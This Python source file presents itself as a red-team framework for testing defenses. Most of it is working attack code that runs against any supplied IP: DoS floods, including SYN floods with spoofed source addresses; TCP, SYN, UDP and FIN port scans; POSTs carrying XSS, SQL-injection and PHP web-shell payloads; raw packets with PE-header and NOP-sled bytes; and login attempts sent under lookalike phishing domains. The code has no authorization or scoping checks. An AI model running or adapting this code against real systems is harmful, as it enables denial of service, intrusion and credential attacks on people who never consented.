"""
Professional Attack Simulation Framework
Red Team Environment for Testing Cybersecurity Defenses
"""

import threading
import time
import random
import socket
import struct
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP, ICMP
import requests
import subprocess
from typing import Dict, List, Any, Optional
from abc import ABC, abstractmethod
from dataclasses import dataclass
from enum import Enum
import logging
import json
import sqlite3

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AttackType(Enum):
    DOS = "dos"
    PORT_SCAN = "port_scan"
    MALWARE = "malware"
    PHISHING = "phishing"
    BRUTE_FORCE = "brute_force"
    SQL_INJECTION = "sql_injection"

class AttackStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    STOPPED = "stopped"

@dataclass
class AttackScenario:
    """Professional attack scenario configuration"""
    scenario_id: str
    attack_type: AttackType
    target_ip: str
    target_ports: List[int]
    duration: int  # seconds
    intensity: str  # low, medium, high, critical
    parameters: Dict[str, Any]
    status: AttackStatus = AttackStatus.PENDING
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    packets_sent: int = 0
    success_rate: float = 0.0

class BaseAttackSimulator(ABC):
    """
    Abstract base class for all attack simulators
    Provides common functionality and attack orchestration
    """
    
    def __init__(self, attack_type: AttackType, simulator_id: str):
        self.attack_type = attack_type
        self.simulator_id = simulator_id
        self.is_running = False
        self.current_scenario = None
        self.attack_stats = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'packets_sent': 0,
            'start_time': time.time()
        }
        
        # Database for attack logging
        self.db_path = "attack_simulation.db"
        self._init_database()
        
        logger.info(f"Initialized {attack_type.value} attack simulator: {simulator_id}")

    def _init_database(self):
        """Initialize attack simulation database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_scenarios (
                scenario_id TEXT PRIMARY KEY,
                attack_type TEXT,
                target_ip TEXT,
                target_ports TEXT,
                duration INTEGER,
                intensity TEXT,
                parameters TEXT,
                status TEXT,
                start_time REAL,
                end_time REAL,
                packets_sent INTEGER,
                success_rate REAL
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scenario_id TEXT,
                timestamp REAL,
                action TEXT,
                target TEXT,
                success BOOLEAN,
                details TEXT
            )
        ''')
        
        conn.commit()
        conn.close()

    def start_attack(self, scenario: AttackScenario) -> bool:
        """Start attack scenario"""
        if self.is_running:
            logger.warning(f"Attack simulator {self.simulator_id} already running")
            return False
        
        self.current_scenario = scenario
        self.is_running = True
        scenario.status = AttackStatus.RUNNING
        scenario.start_time = time.time()
        
        # Store scenario in database
        self._store_scenario(scenario)
        
        # Start attack thread
        attack_thread = threading.Thread(target=self._execute_attack, daemon=True)
        attack_thread.start()
        
        logger.info(f"Started {self.attack_type.value} attack: {scenario.scenario_id}")
        return True

    def stop_attack(self):
        """Stop current attack"""
        if not self.is_running:
            return
        
        self.is_running = False
        if self.current_scenario:
            self.current_scenario.status = AttackStatus.STOPPED
            self.current_scenario.end_time = time.time()
            self._update_scenario(self.current_scenario)
        
        logger.info(f"Stopped {self.attack_type.value} attack")

    def _execute_attack(self):
        """Execute the attack scenario"""
        try:
            scenario = self.current_scenario
            end_time = scenario.start_time + scenario.duration
            
            while self.is_running and time.time() < end_time:
                success = self._perform_attack_action(scenario)
                
                scenario.packets_sent += 1
                if success:
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['packets_sent'] += 1
                
                # Log attack action
                self._log_attack_action(scenario, success)
                
                # Delay based on intensity
                delay = self._get_attack_delay(scenario.intensity)
                time.sleep(delay)
            
            # Complete attack
            scenario.status = AttackStatus.COMPLETED
            scenario.end_time = time.time()
            scenario.success_rate = (
                self.attack_stats['successful_attacks'] / max(scenario.packets_sent, 1)
            )
            
            self._update_scenario(scenario)
            self.is_running = False
            
            logger.info(f"Completed attack {scenario.scenario_id}: "
                       f"{scenario.packets_sent} packets, "
                       f"{scenario.success_rate:.2%} success rate")
            
        except Exception as e:
            logger.error(f"Attack execution error: {e}")
            if self.current_scenario:
                self.current_scenario.status = AttackStatus.FAILED
                self._update_scenario(self.current_scenario)
            self.is_running = False

    @abstractmethod
    def _perform_attack_action(self, scenario: AttackScenario) -> bool:
        """Perform single attack action - implemented by subclasses"""
        pass

    def _get_attack_delay(self, intensity: str) -> float:
        """Get delay between attacks based on intensity"""
        delays = {
            'low': random.uniform(1.0, 3.0),
            'medium': random.uniform(0.1, 1.0),
            'high': random.uniform(0.01, 0.1),
            'critical': random.uniform(0.001, 0.01)
        }
        return delays.get(intensity, 1.0)

    def _store_scenario(self, scenario: AttackScenario):
        """Store attack scenario in database"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT OR REPLACE INTO attack_scenarios
                (scenario_id, attack_type, target_ip, target_ports, duration, 
                 intensity, parameters, status, start_time, end_time, 
                 packets_sent, success_rate)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                scenario.scenario_id,
                scenario.attack_type.value,
                scenario.target_ip,
                json.dumps(scenario.target_ports),
                scenario.duration,
                scenario.intensity,
                json.dumps(scenario.parameters),
                scenario.status.value,
                scenario.start_time,
                scenario.end_time,
                scenario.packets_sent,
                scenario.success_rate
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"Error storing scenario: {e}")

    def _update_scenario(self, scenario: AttackScenario):
        """Update attack scenario in database"""
        self._store_scenario(scenario)

    def _log_attack_action(self, scenario: AttackScenario, success: bool):
        """Log individual attack action"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO attack_logs
                (scenario_id, timestamp, action, target, success, details)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                scenario.scenario_id,
                time.time(),
                self.attack_type.value,
                scenario.target_ip,
                success,
                json.dumps({'packets_sent': scenario.packets_sent})
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"Error logging attack action: {e}")

    def get_attack_statistics(self) -> Dict[str, Any]:
        """Get comprehensive attack statistics"""
        uptime = time.time() - self.attack_stats['start_time']
        
        return {
            'simulator_id': self.simulator_id,
            'attack_type': self.attack_type.value,
            'is_running': self.is_running,
            'current_scenario': self.current_scenario.scenario_id if self.current_scenario else None,
            'uptime': uptime,
            'total_attacks': self.attack_stats['total_attacks'],
            'successful_attacks': self.attack_stats['successful_attacks'],
            'packets_sent': self.attack_stats['packets_sent'],
            'success_rate': (
                self.attack_stats['successful_attacks'] / max(self.attack_stats['packets_sent'], 1)
            )
        }

class DoSAttackSimulator(BaseAttackSimulator):
    """
    Professional DoS attack simulator
    Generates realistic Denial of Service attack patterns
    """
    
    def __init__(self, simulator_id: str = "dos_simulator"):
        super().__init__(AttackType.DOS, simulator_id)
        
        # DoS-specific configuration
        self.dos_techniques = [
            'tcp_flood',
            'udp_flood',
            'icmp_flood',
            'syn_flood',
            'slowloris',
            'http_flood'
        ]

    def _perform_attack_action(self, scenario: AttackScenario) -> bool:
        """Perform DoS attack action"""
        technique = scenario.parameters.get('technique', 'tcp_flood')
        
        try:
            if technique == 'tcp_flood':
                return self._tcp_flood_attack(scenario)
            elif technique == 'udp_flood':
                return self._udp_flood_attack(scenario)
            elif technique == 'syn_flood':
                return self._syn_flood_attack(scenario)
            elif technique == 'icmp_flood':
                return self._icmp_flood_attack(scenario)
            elif technique == 'http_flood':
                return self._http_flood_attack(scenario)
            else:
                return self._tcp_flood_attack(scenario)  # Default
                
        except Exception as e:
            logger.error(f"DoS attack action failed: {e}")
            return False

    def _tcp_flood_attack(self, scenario: AttackScenario) -> bool:
        """TCP flood attack"""
        try:
            target_port = random.choice(scenario.target_ports)
            source_port = random.randint(1024, 65535)
            
            # Create TCP packet
            packet = IP(dst=scenario.target_ip) / TCP(
                sport=source_port,
                dport=target_port,
                flags="S",  # SYN flag
                seq=random.randint(1000, 9000)
            )
            
            # Send packet
            scapy.send(packet, verbose=0)
            
            logger.debug(f"TCP flood: {scenario.target_ip}:{target_port}")
            return True
            
        except Exception as e:
            logger.error(f"TCP flood error: {e}")
            return False

    def _udp_flood_attack(self, scenario: AttackScenario) -> bool:
        """UDP flood attack"""
        try:
            target_port = random.choice(scenario.target_ports)
            payload_size = scenario.parameters.get('payload_size', 1024)
            payload = b'A' * payload_size
            
            # Create UDP packet
            packet = IP(dst=scenario.target_ip) / UDP(
                dport=target_port
            ) / payload
            
            # Send packet
            scapy.send(packet, verbose=0)
            
            logger.debug(f"UDP flood: {scenario.target_ip}:{target_port}")
            return True
            
        except Exception as e:
            logger.error(f"UDP flood error: {e}")
            return False

    def _syn_flood_attack(self, scenario: AttackScenario) -> bool:
        """SYN flood attack"""
        try:
            target_port = random.choice(scenario.target_ports)
            
            # Random source IP for amplification
            source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            source_port = random.randint(1024, 65535)
            
            # Create SYN packet with spoofed source
            packet = IP(src=source_ip, dst=scenario.target_ip) / TCP(
                sport=source_port,
                dport=target_port,
                flags="S",
                seq=random.randint(1000, 9000)
            )
            
            # Send packet
            scapy.send(packet, verbose=0)
            
            logger.debug(f"SYN flood: {source_ip} -> {scenario.target_ip}:{target_port}")
            return True
            
        except Exception as e:
            logger.error(f"SYN flood error: {e}")
            return False

    def _icmp_flood_attack(self, scenario: AttackScenario) -> bool:
        """ICMP flood attack"""
        try:
            payload_size = scenario.parameters.get('payload_size', 1024)
            payload = b'A' * payload_size
            
            # Create ICMP packet
            packet = IP(dst=scenario.target_ip) / ICMP() / payload
            
            # Send packet
            scapy.send(packet, verbose=0)
            
            logger.debug(f"ICMP flood: {scenario.target_ip}")
            return True
            
        except Exception as e:
            logger.error(f"ICMP flood error: {e}")
            return False

    def _http_flood_attack(self, scenario: AttackScenario) -> bool:
        """HTTP flood attack"""
        try:
            target_port = 80 if 80 in scenario.target_ports else scenario.target_ports[0]
            url = f"http://{scenario.target_ip}:{target_port}/"
            
            # Random user agent
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            
            # Send HTTP request
            response = requests.get(url, headers=headers, timeout=5)
            
            logger.debug(f"HTTP flood: {url} -> {response.status_code}")
            return response.status_code == 200
            
        except Exception as e:
            logger.debug(f"HTTP flood error: {e}")
            return False

class PortScanSimulator(BaseAttackSimulator):
    """
    Professional port scanning simulator
    Generates realistic reconnaissance and scanning patterns
    """
    
    def __init__(self, simulator_id: str = "port_scan_simulator"):
        super().__init__(AttackType.PORT_SCAN, simulator_id)
        
        # Port scan techniques
        self.scan_techniques = [
            'tcp_connect',
            'syn_scan',
            'udp_scan',
            'fin_scan',
            'xmas_scan',
            'null_scan'
        ]

    def _perform_attack_action(self, scenario: AttackScenario) -> bool:
        """Perform port scan action"""
        technique = scenario.parameters.get('technique', 'tcp_connect')
        
        try:
            if technique == 'tcp_connect':
                return self._tcp_connect_scan(scenario)
            elif technique == 'syn_scan':
                return self._syn_scan(scenario)
            elif technique == 'udp_scan':
                return self._udp_scan(scenario)
            elif technique == 'fin_scan':
                return self._fin_scan(scenario)
            else:
                return self._tcp_connect_scan(scenario)  # Default
                
        except Exception as e:
            logger.error(f"Port scan action failed: {e}")
            return False

    def _tcp_connect_scan(self, scenario: AttackScenario) -> bool:
        """TCP connect scan"""
        try:
            target_port = random.choice(scenario.target_ports)
            
            # Attempt TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            
            result = sock.connect_ex((scenario.target_ip, target_port))
            sock.close()
            
            is_open = result == 0
            
            logger.debug(f"TCP connect scan: {scenario.target_ip}:{target_port} -> {'OPEN' if is_open else 'CLOSED'}")
            return True  # Scan attempt successful regardless of port state
            
        except Exception as e:
            logger.error(f"TCP connect scan error: {e}")
            return False

    def _syn_scan(self, scenario: AttackScenario) -> bool:
        """SYN scan (stealth scan)"""
        try:
            target_port = random.choice(scenario.target_ports)
            source_port = random.randint(1024, 65535)
            
            # Create SYN packet
            packet = IP(dst=scenario.target_ip) / TCP(
                sport=source_port,
                dport=target_port,
                flags="S",
                seq=random.randint(1000, 9000)
            )
            
            # Send packet and listen for response
            response = scapy.sr1(packet, timeout=1, verbose=0)
            
            if response and response.haslayer(TCP):
                if response[TCP].flags == 18:  # SYN-ACK
                    logger.debug(f"SYN scan: {scenario.target_ip}:{target_port} -> OPEN")
                elif response[TCP].flags == 20:  # RST-ACK
                    logger.debug(f"SYN scan: {scenario.target_ip}:{target_port} -> CLOSED")
            
            return True
            
        except Exception as e:
            logger.error(f"SYN scan error: {e}")
            return False

    def _udp_scan(self, scenario: AttackScenario) -> bool:
        """UDP port scan"""
        try:
            target_port = random.choice(scenario.target_ports)
            
            # Create UDP packet
            packet = IP(dst=scenario.target_ip) / UDP(dport=target_port)
            
            # Send packet and listen for ICMP response
            response = scapy.sr1(packet, timeout=2, verbose=0)
            
            if response:
                if response.haslayer(ICMP):
                    logger.debug(f"UDP scan: {scenario.target_ip}:{target_port} -> CLOSED")
                else:
                    logger.debug(f"UDP scan: {scenario.target_ip}:{target_port} -> OPEN/FILTERED")
            else:
                logger.debug(f"UDP scan: {scenario.target_ip}:{target_port} -> OPEN/FILTERED")
            
            return True
            
        except Exception as e:
            logger.error(f"UDP scan error: {e}")
            return False

    def _fin_scan(self, scenario: AttackScenario) -> bool:
        """FIN scan (stealth technique)"""
        try:
            target_port = random.choice(scenario.target_ports)
            source_port = random.randint(1024, 65535)
            
            # Create FIN packet
            packet = IP(dst=scenario.target_ip) / TCP(
                sport=source_port,
                dport=target_port,
                flags="F"  # FIN flag
            )
            
            # Send packet
            response = scapy.sr1(packet, timeout=1, verbose=0)
            
            if response and response.haslayer(TCP):
                if response[TCP].flags == 20:  # RST-ACK
                    logger.debug(f"FIN scan: {scenario.target_ip}:{target_port} -> CLOSED")
            else:
                logger.debug(f"FIN scan: {scenario.target_ip}:{target_port} -> OPEN/FILTERED")
            
            return True
            
        except Exception as e:
            logger.error(f"FIN scan error: {e}")
            return False

class MalwareSimulator(BaseAttackSimulator):
    """
    Professional malware simulation
    Generates realistic malware delivery attempts and payloads
    """
    
    def __init__(self, simulator_id: str = "malware_simulator"):
        super().__init__(AttackType.MALWARE, simulator_id)
        
        # Malware simulation techniques
        self.malware_types = [
            'trojan_download',
            'script_injection',
            'payload_delivery',
            'command_execution',
            'file_infection'
        ]

    def _perform_attack_action(self, scenario: AttackScenario) -> bool:
        """Perform malware simulation action"""
        malware_type = scenario.parameters.get('malware_type', 'payload_delivery')
        
        try:
            if malware_type == 'trojan_download':
                return self._simulate_trojan_download(scenario)
            elif malware_type == 'script_injection':
                return self._simulate_script_injection(scenario)
            elif malware_type == 'payload_delivery':
                return self._simulate_payload_delivery(scenario)
            else:
                return self._simulate_payload_delivery(scenario)  # Default
                
        except Exception as e:
            logger.error(f"Malware simulation failed: {e}")
            return False

    def _simulate_trojan_download(self, scenario: AttackScenario) -> bool:
        """Simulate trojan download attempt"""
        try:
            # Simulate HTTP request to download malicious file
            target_port = 80 if 80 in scenario.target_ports else scenario.target_ports[0]
            url = f"http://{scenario.target_ip}:{target_port}/malicious_file.exe"
            
            # Suspicious user agent
            headers = {
                'User-Agent': 'Malware-Downloader/1.0',
                'Accept': 'application/octet-stream'
            }
            
            # Attempt download (will likely fail, but generates suspicious traffic)
            try:
                response = requests.get(url, headers=headers, timeout=5)
                logger.debug(f"Trojan download attempt: {url} -> {response.status_code}")
            except:
                logger.debug(f"Trojan download attempt: {url} -> FAILED")
            
            return True
            
        except Exception as e:
            logger.error(f"Trojan download simulation error: {e}")
            return False

    def _simulate_script_injection(self, scenario: AttackScenario) -> bool:
        """Simulate script injection attempt"""
        try:
            target_port = 80 if 80 in scenario.target_ports else scenario.target_ports[0]
            
            # Malicious payloads
            payloads = [
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                "'; DROP TABLE users; --",
                "<?php system($_GET['cmd']); ?>",
                "javascript:alert('XSS')"
            ]
            
            payload = random.choice(payloads)
            
            # Send malicious payload
            url = f"http://{scenario.target_ip}:{target_port}/search"
            data = {'q': payload}
            
            try:
                response = requests.post(url, data=data, timeout=5)
                logger.debug(f"Script injection: {payload[:20]}... -> {response.status_code}")
            except:
                logger.debug(f"Script injection: {payload[:20]}... -> FAILED")
            
            return True
            
        except Exception as e:
            logger.error(f"Script injection simulation error: {e}")
            return False

    def _simulate_payload_delivery(self, scenario: AttackScenario) -> bool:
        """Simulate malicious payload delivery"""
        try:
            target_port = random.choice(scenario.target_ports)
            
            # Create packet with suspicious payload
            suspicious_payloads = [
                b'\x4d\x5a\x90\x00',  # PE header
                b'exec(',
                b'system(',
                b'/bin/sh',
                b'cmd.exe',
                b'\x90\x90\x90\x90'  # NOP sled
            ]
            
            payload = random.choice(suspicious_payloads) + b'A' * 100
            
            # Send via TCP
            packet = IP(dst=scenario.target_ip) / TCP(dport=target_port) / payload
            scapy.send(packet, verbose=0)
            
            logger.debug(f"Payload delivery: {scenario.target_ip}:{target_port} ({len(payload)} bytes)")
            return True
            
        except Exception as e:
            logger.error(f"Payload delivery simulation error: {e}")
            return False

class PhishingSimulator(BaseAttackSimulator):
    """
    Professional phishing simulation
    Generates realistic phishing attempts and social engineering
    """
    
    def __init__(self, simulator_id: str = "phishing_simulator"):
        super().__init__(AttackType.PHISHING, simulator_id)
        
        # Phishing techniques
        self.phishing_types = [
            'email_phishing',
            'url_spoofing',
            'credential_harvesting',
            'social_engineering'
        ]

    def _perform_attack_action(self, scenario: AttackScenario) -> bool:
        """Perform phishing simulation action"""
        phishing_type = scenario.parameters.get('phishing_type', 'url_spoofing')
        
        try:
            if phishing_type == 'url_spoofing':
                return self._simulate_url_spoofing(scenario)
            elif phishing_type == 'credential_harvesting':
                return self._simulate_credential_harvesting(scenario)
            else:
                return self._simulate_url_spoofing(scenario)  # Default
                
        except Exception as e:
            logger.error(f"Phishing simulation failed: {e}")
            return False

    def _simulate_url_spoofing(self, scenario: AttackScenario) -> bool:
        """Simulate URL spoofing attempt"""
        try:
            # Suspicious domains
            spoofed_domains = [
                'paypaI.com',  # Capital I instead of l
                'arnazon.com',  # rn instead of m
                'microsft.com',  # missing o
                'goog1e.com'  # 1 instead of l
            ]
            
            domain = random.choice(spoofed_domains)
            target_port = 80 if 80 in scenario.target_ports else scenario.target_ports[0]
            
            # Attempt to access spoofed URL
            url = f"http://{scenario.target_ip}:{target_port}/login"
            headers = {
                'Host': domain,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Referer': f'http://{domain}/'
            }
            
            try:
                response = requests.get(url, headers=headers, timeout=5)
                logger.debug(f"URL spoofing: {domain} -> {response.status_code}")
            except:
                logger.debug(f"URL spoofing: {domain} -> FAILED")
            
            return True
            
        except Exception as e:
            logger.error(f"URL spoofing simulation error: {e}")
            return False

    def _simulate_credential_harvesting(self, scenario: AttackScenario) -> bool:
        """Simulate credential harvesting attempt"""
        try:
            target_port = 80 if 80 in scenario.target_ports else scenario.target_ports[0]
            url = f"http://{scenario.target_ip}:{target_port}/login"
            
            # Fake credentials
            fake_credentials = [
                {'username': 'admin', 'password': 'password123'},
                {'username': 'user@company.com', 'password': 'Welcome123'},
                {'username': 'test', 'password': 'test123'}
            ]
            
            creds = random.choice(fake_credentials)
            
            try:
                response = requests.post(url, data=creds, timeout=5)
                logger.debug(f"Credential harvesting: {creds['username']} -> {response.status_code}")
            except:
                logger.debug(f"Credential harvesting: {creds['username']} -> FAILED")
            
            return True
            
        except Exception as e:
            logger.error(f"Credential harvesting simulation error: {e}")
            return False
